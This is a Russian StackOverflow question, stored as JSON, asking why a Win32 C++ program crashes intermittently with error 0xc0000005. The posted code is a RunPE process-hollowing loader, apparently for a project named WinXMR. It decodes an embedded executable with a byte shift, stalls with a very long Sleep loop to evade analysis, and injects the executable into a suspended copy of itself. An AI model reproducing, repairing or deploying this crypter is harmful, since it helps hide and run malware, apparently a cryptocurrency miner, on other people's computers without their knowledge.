{"tags":["c++","winapi"],"owner":{"reputation":1,"user_id":320569,"user_type":"registered","profile_image":"https://www.gravatar.com/avatar/5119be6db33130330ec292241d283793?s=128&d=identicon&r=PG&f=1","display_name":"Халил Мурадов","link":"https://ru.stackoverflow.com/users/320569/%d0%a5%d0%b0%d0%bb%d0%b8%d0%bb-%d0%9c%d1%83%d1%80%d0%b0%d0%b4%d0%be%d0%b2"},"is_answered":true,"view_count":189,"answer_count":1,"score":0,"last_activity_date":1559457011,"creation_date":1544886439,"last_edit_date":1545021739,"question_id":921312,"link":"https://ru.stackoverflow.com/questions/921312/%d0%9f%d1%80%d0%be%d0%b3%d1%80%d0%b0%d0%bc%d0%bc%d0%b0-%d0%b7%d0%b0%d0%bf%d1%83%d1%81%d0%ba%d0%b0%d0%b5%d1%82%d1%81%d1%8f-%d1%87%d0%b5%d1%80%d0%b5%d0%b7-%d1%80%d0%b0%d0%b7-0xc0000005-c","title":"Программа запускается через раз 0xc0000005 C++","body":"<p>В общем, компилирую программу в Release Win32, на выходе получаю свою программу, но вот она запускается через раз, то есть, иногда нормально запускает runPE(rawData), а иногда выдаёт Ошибку </p>\n\n<blockquote>\n  <p>моя_программа.exe - Ошибка приложения </p>\n  \n  <p>Ошибка при запуске приложения\n  (0xc0000005). Для выхода из приложения нажмите кнопку \"ОК\".</p>\n</blockquote>\n\n<p><a href=\"https://pastebin.com/RiQn2ked\" rel=\"nofollow noreferrer\">Вот код программы </a></p>\n\n<pre><code>#define _CRT_SECURE_NO_WARNINGS\n#define _CRT_SECURE_NO_DEPRECATE\n#define _CRT_NONSTDC_NO_DEPRECATE\n#define CRYPT\n#pragma warning(disable : 4996)\n\n\n#include \"stdafx.h\"\n#include \"WinXMR.h\"\n#include &lt;iostream&gt; // Standard C++ library for console I/O\n#include &lt;string&gt; // Standard C++ Library for string manip\n\n#include &lt;windows.h&gt;\n#include &lt;winternl.h&gt;\n#include &lt;TlHelp32.h&gt; //WinAPI Process API\n#pragma comment(lib,\"ws2_32.lib\")\n#pragma comment(lib,\"ntdll.lib\") \n\n\n#define MAX_LOADSTRING 100\n\n// Глобальные переменные:\nHINSTANCE hInst;                                // текущий экземпляр\nWCHAR szTitle[MAX_LOADSTRING];                  // Текст строки заголовка\nWCHAR szWindowClass[MAX_LOADSTRING];            // имя класса главного окна\n\n// Отправить объявления функций, включенных в этот модуль кода:\nATOM                MyRegisterClass(HINSTANCE hInstance);\nBOOL                InitInstance(HINSTANCE, int);\nLRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);\nINT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);\n\n\nint RunPortableExecutable(void* Image)\n{\n    IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols\n    IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects &amp; symbols\n    IMAGE_SECTION_HEADER* SectionHeader;\n\n    PROCESS_INFORMATION PI;\n    STARTUPINFOA SI;\n\n    CONTEXT* CTX;\n\n    DWORD* ImageBase; //Base address of the image\n    void* pImageBase; // Pointer to the image base\n\n    int count;\n    char CurrentFilePath[1024];\n\n    DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable\n    NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew); // Initialize\n\n    GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable\n\n    if (NtHeader-&gt;Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.\n    {\n        ZeroMemory(&amp;PI, sizeof(PI)); // Null the memory\n        ZeroMemory(&amp;SI, sizeof(SI)); // Null the memory\n\n        if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,\n            CREATE_SUSPENDED, NULL, NULL, &amp;SI, &amp;PI)) // Create a new instance of current\n            //process in suspended state, for the new image.\n        {\n            // Allocate memory for the context.\n            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));\n            CTX-&gt;ContextFlags = CONTEXT_FULL; // Context is allocated\n\n            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread\n            {\n                // Read instructions\n                ReadProcessMemory(PI.hProcess, LPCVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;ImageBase), 4, 0);\n\n                pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader-&gt;OptionalHeader.ImageBase),\n                    NtHeader-&gt;OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);\n\n                // Write the image to the process\n                WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, NULL);\n\n                for (count = 0; count &lt; NtHeader-&gt;FileHeader.NumberOfSections; count++)\n                {\n                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader-&gt;e_lfanew + 248 + (count * 40));\n\n                    WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader-&gt;VirtualAddress),\n                        LPVOID(DWORD(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, 0);\n                }\n                WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + 8),\n                    LPVOID(&amp;NtHeader-&gt;OptionalHeader.ImageBase), 4, 0);\n\n                // Move address of entry point to the eax register\n                CTX-&gt;Eax = DWORD(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint;\n                SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context\n                ResumeThread(PI.hThread); //´Start the process/call main()\n\n                return 0; // Operation was successful.\n            }\n        }\n    }\n}\n\n// бинарный код программы\nunsigned char rawData[] = {\n    // 284448 строк бинарника\n};\n\n\n\n\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance,\n                     _In_opt_ HINSTANCE hPrevInstance,\n                     _In_ LPWSTR    lpCmdLine,\n                     _In_ int       nCmdShow)\n{\n    UNREFERENCED_PARAMETER(hPrevInstance);\n    UNREFERENCED_PARAMETER(lpCmdLine);\n\n    for (int i = 0; i &lt; 550000; i++)\n        Sleep(1000);\n    for (int i = 0; i &lt; sizeof(rawData) / sizeof(*rawData); i++) {\n        unsigned char b = rawData[i] + 0x11;\n        rawData[i] = b;\n    }\n    Sleep(3000); //задержка\n    RunPortableExecutable(rawData); // run executable from the array\n    getchar();\n    delete rawData;\n    // TODO: Разместите код здесь.\n\n    // Инициализация глобальных строк\n    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);\n    LoadStringW(hInstance, IDC_WINXMR, szWindowClass, MAX_LOADSTRING);\n    MyRegisterClass(hInstance);\n\n    // Выполнить инициализацию приложения:\n    if (!InitInstance (hInstance, nCmdShow))\n    {\n        return FALSE;\n    }\n\n    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WINXMR));\n\n    MSG msg;\n\n    // Цикл основного сообщения:\n    while (GetMessage(&amp;msg, nullptr, 0, 0))\n    {\n        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg))\n        {\n            TranslateMessage(&amp;msg);\n            DispatchMessage(&amp;msg);\n        }\n    }\n\n    return (int) msg.wParam;\n}\n\n\n\n//\n//  ФУНКЦИЯ: MyRegisterClass()\n//\n//  ЦЕЛЬ: Регистрирует класс окна.\n//\nATOM MyRegisterClass(HINSTANCE hInstance)\n{\n    WNDCLASSEXW wcex;\n\n    wcex.cbSize = sizeof(WNDCLASSEX);\n\n    wcex.style          = CS_HREDRAW | CS_VREDRAW;\n    wcex.lpfnWndProc    = WndProc;\n    wcex.cbClsExtra     = 0;\n    wcex.cbWndExtra     = 0;\n    wcex.hInstance      = hInstance;\n    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WINXMR));\n    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);\n    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);\n    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_WINXMR);\n    wcex.lpszClassName  = szWindowClass;\n    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));\n\n    return RegisterClassExW(&amp;wcex);\n}\n\n//\n//   ФУНКЦИЯ: InitInstance(HINSTANCE, int)\n//\n//   ЦЕЛЬ: Сохраняет маркер экземпляра и создает главное окно\n//\n//   КОММЕНТАРИИ:\n//\n//        В этой функции маркер экземпляра сохраняется в глобальной переменной, а также\n//        создается и выводится главное окно программы.\n//\nBOOL InitInstance(HINSTANCE hInstance, int nCmdShow)\n{\n   hInst = hInstance; // Сохранить маркер экземпляра в глобальной переменной\n\n   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,\n      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);\n\n   if (!hWnd)\n   {\n      return FALSE;\n   }\n\n   ShowWindow(hWnd, nCmdShow);\n   UpdateWindow(hWnd);\n\n   return TRUE;\n}\n\n//\n//  ФУНКЦИЯ: WndProc(HWND, UINT, WPARAM, LPARAM)\n//\n//  ЦЕЛЬ: Обрабатывает сообщения в главном окне.\n//\n//  WM_COMMAND  - обработать меню приложения\n//  WM_PAINT    - Отрисовка главного окна\n//  WM_DESTROY  - отправить сообщение о выходе и вернуться\n//\n//\nLRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    switch (message)\n    {\n    case WM_COMMAND:\n        {\n            int wmId = LOWORD(wParam);\n            // Разобрать выбор в меню:\n            switch (wmId)\n            {\n            case IDM_ABOUT:\n                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);\n                break;\n            case IDM_EXIT:\n                DestroyWindow(hWnd);\n                break;\n            default:\n                return DefWindowProc(hWnd, message, wParam, lParam);\n            }\n        }\n        break;\n    case WM_PAINT:\n        {\n            PAINTSTRUCT ps;\n            HDC hdc = BeginPaint(hWnd, &amp;ps);\n            // TODO: Добавьте сюда любой код прорисовки, использующий HDC...\n            EndPaint(hWnd, &amp;ps);\n        }\n        break;\n    case WM_DESTROY:\n        PostQuitMessage(0);\n        break;\n    default:\n        return DefWindowProc(hWnd, message, wParam, lParam);\n    }\n    return 0;\n}\n\n// Обработчик сообщений для окна \"О программе\".\nINT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    UNREFERENCED_PARAMETER(lParam);\n    switch (message)\n    {\n    case WM_INITDIALOG:\n        return (INT_PTR)TRUE;\n\n    case WM_COMMAND:\n        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)\n        {\n            EndDialog(hDlg, LOWORD(wParam));\n            return (INT_PTR)TRUE;\n        }\n        break;\n    }\n    return (INT_PTR)FALSE;\n}\n</code></pre>\n\n<p>На некоторых компьютерах вовсе отображается,  что приложение не является win32</p>\n"}